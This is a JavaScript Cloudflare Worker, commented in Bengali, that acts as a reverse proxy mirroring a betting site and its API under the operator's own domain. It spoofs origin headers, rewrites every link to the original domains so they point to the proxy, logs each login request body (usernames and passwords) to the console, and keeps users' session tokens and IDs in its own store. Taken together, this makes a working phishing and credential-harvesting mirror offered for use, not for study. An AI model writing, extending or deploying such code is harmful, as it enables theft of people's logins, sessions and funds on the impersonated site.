// =====================================================
// অ্যাডভান্সড রিভার্স প্রক্সি – ডায়নামিক API + সেশন ম্যানেজমেন্ট
// =====================================================

const TARGET_WEB = 'https://velki123.win';
const TARGET_API = 'https://vrnlapi.com:4041';

// সেশন স্টোর (ক্লাউডফ্লেয়ার KV ব্যবহার করুন প্রোডাকশনে)
let sessionStore = new Map();

async function handleRequest(request) {
  const url = new URL(request.url);
  const incomingDomain = url.hostname;
  const requestPath = url.pathname;
  
  // 1. API ডিটেকশন (স্মার্ট – সব JSON রিকোয়েস্ট ধরে)
  const contentType = request.headers.get('content-type') || '';
  const acceptHeader = request.headers.get('accept') || '';
  const isApiRequest = requestPath.includes('/v1/') || 
                       requestPath.includes('/api/') ||
                       contentType.includes('application/json') ||
                       acceptHeader.includes('application/json');
  
  // 2. কুকি থেকে সেশন এক্সট্র্যাক্ট
  const cookies = request.headers.get('cookie') || '';
  let sessionId = extractSessionId(cookies);
  
  // 3. টার্গেট নির্বাচন
  const targetBase = isApiRequest ? TARGET_API : TARGET_WEB;
  const targetUrl = new URL(requestPath + url.search, targetBase);
  
  // 4. হেডার প্রস্তুত (মূল সাইটের মতো)
  const headers = new Headers(request.headers);
  headers.set('Host', targetUrl.hostname);
  headers.set('Origin', TARGET_WEB);
  headers.set('Referer', TARGET_WEB + '/');
  headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
  
  // CSRF টোকেন যোগ (যদি সেশনে থাকে)
  if (sessionStore.has(sessionId) && sessionStore.get(sessionId).csrfToken) {
    headers.set('X-CSRF-Token', sessionStore.get(sessionId).csrfToken);
  }
  
  // API হেডার
  if (isApiRequest) {
    headers.set('Accept', 'application/json, text/plain, */*');
    headers.set('Content-Type', 'application/json');
    headers.delete('CF-Access-Client-UID');
    headers.delete('CF-RAY');
  }
  
  // 5. বডি প্রসেস (যদি এনক্রিপ্টেড হয়)
  let body = request.body;
  let originalBody = null;
  
  if (request.method === 'POST' && requestPath.includes('/login')) {
    // লগইন রিকোয়েস্ট – বডি পড়ে প্রয়োজনীয় ফিল্ড চেক
    const textBody = await request.text();
    originalBody = textBody;
    console.log('Login attempt body:', textBody);
    
    // কাস্টম প্রসেসিং (যদি ইউজারনেম/পাসওয়ার্ড অন্য ফরম্যাটে থাকে)
    let jsonBody;
    try {
      jsonBody = JSON.parse(textBody);
      // validationCode সরিয়ে ফেলুন (অপশনাল)
      if (jsonBody.validationCode && !jsonBody.uniqueId) {
        jsonBody.uniqueId = parseInt(jsonBody.validationCode);
        delete jsonBody.validationCode;
      }
      body = JSON.stringify(jsonBody);
    } catch(e) {
      body = textBody;
    }
  }
  
  // 6. রিকোয়েস্ট ফরোয়ার্ড
  const modifiedRequest = new Request(targetUrl, {
    method: request.method,
    headers: headers,
    body: request.method !== 'GET' && request.method !== 'HEAD' ? body : undefined,
    redirect: 'manual'
  });
  
  // 7. ফেচ (রিট্রাই মেকানিজম সহ)
  let response = await fetchWithRetry(modifiedRequest);
  
  // 8. রেসপন্স প্রসেস
  const responseHeaders = new Headers(response.headers);
  let responseBody = response.body;
  let responseData = null;
  
  // API রেসপন্স পার্স ও মডিফাই
  if (isApiRequest && response.headers.get('content-type')?.includes('application/json')) {
    responseData = await response.json();
    
    // লগইন সফল হলে সেশন সেভ
    if (requestPath.includes('/login') && responseData.success === true) {
      sessionId = generateSessionId();
      sessionStore.set(sessionId, {
        userId: responseData.results?.userId,
        token: responseData.results?.token,
        csrfToken: responseData.results?.csrfToken || generateCsrfToken(),
        createdAt: Date.now()
      });
      
      // সফল রেসপন্সে ডোমেইন পরিবর্তন
      responseData.proxyDomain = incomingDomain;
      responseData.message = "Login successful via proxy";
      responseBody = JSON.stringify(responseData);
      
      // সেট-কুকি তৈরি
      const sessionCookie = `session_id=${sessionId}; Domain=${incomingDomain}; Path=/; HttpOnly; SameSite=Lax`;
      responseHeaders.set('Set-Cookie', sessionCookie);
    }
    
    // ব্যালেন্স রেসপন্স
    else if (requestPath.includes('/balance') && responseData) {
      responseData.proxyNote = "Balance fetched via proxy";
      responseBody = JSON.stringify(responseData);
    }
    
    // এরর রেসপন্স হ্যান্ডেল
    else if (responseData?.success === false) {
      console.log(`API Error: ${responseData.message}`);
      // কিছু ক্ষেত্রে API ভিন্ন পোর্টে রিডাইরেক্ট করতে পারে
      if (responseData.message?.includes('redirect')) {
        return handleRedirect(responseData.redirectUrl, incomingDomain);
      }
    }
  }
  
  // 9. HTML/JS রিরাইট (React অ্যাপের জন্য)
  const respContentType = responseHeaders.get('content-type') || '';
  if (!isApiRequest && (respContentType.includes('text/html') || respContentType.includes('javascript'))) {
    let text = responseData ? JSON.stringify(responseData) : await response.text();
    
    // ডাইনামিক রিরাইট – সব এন্ডপয়েন্ট
    const domains = [TARGET_WEB, TARGET_API].map(d => d.replace(/https?:\/\//, '').replace(/:\d+/, ''));
    for (let domain of domains) {
      const regex = new RegExp(`(https?://)?${domain.replace(/\./g, '\\.')}(:\\d+)?`, 'g');
      text = text.replace(regex, `${url.protocol}//${incomingDomain}`);
    }
    
    // React এর build ফাইলের পাথ ঠিক করা
    text = text.replace(/\/static\//g, `/${incomingDomain}/static/`);
    text = text.replace(/\/manifest\.json/g, `/${incomingDomain}/manifest.json`);
    
    responseBody = text;
    responseHeaders.delete('content-length');
  }
  
  // 10. CORS হেডার
  responseHeaders.set('Access-Control-Allow-Origin', url.origin);
  responseHeaders.set('Access-Control-Allow-Credentials', 'true');
  responseHeaders.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  responseHeaders.set('Access-Control-Allow-Headers', 'Content-Type, X-CSRF-Token, Authorization');
  
  // OPTIONS প্রিফ্লাইট
  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: responseHeaders });
  }
  
  return new Response(responseBody, {
    status: response.status,
    statusText: response.statusText,
    headers: responseHeaders
  });
}

// =============== হেল্পার ফাংশন ===============

async function fetchWithRetry(request, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(request);
      if (response.status < 500 || i === retries - 1) return response;
      await new Promise(r => setTimeout(r, 1000 * (i + 1)));
    } catch(e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 1000));
    }
  }
}

function extractSessionId(cookies) {
  const match = cookies.match(/session_id=([^;]+)/);
  return match ? match[1] : 'anonymous_' + Date.now();
}

function generateSessionId() {
  return 'sess_' + Math.random().toString(36).substring(2) + Date.now();
}

function generateCsrfToken() {
  return Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
}

function handleRedirect(redirectUrl, incomingDomain) {
  try {
    const newUrl = new URL(redirectUrl);
    newUrl.hostname = incomingDomain;
    return new Response(null, {
      status: 302,
      headers: { 'Location': newUrl.toString() }
    });
  } catch(e) {
    return new Response(null, { status: 302, headers: { 'Location': '/' } });
  }
}

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});
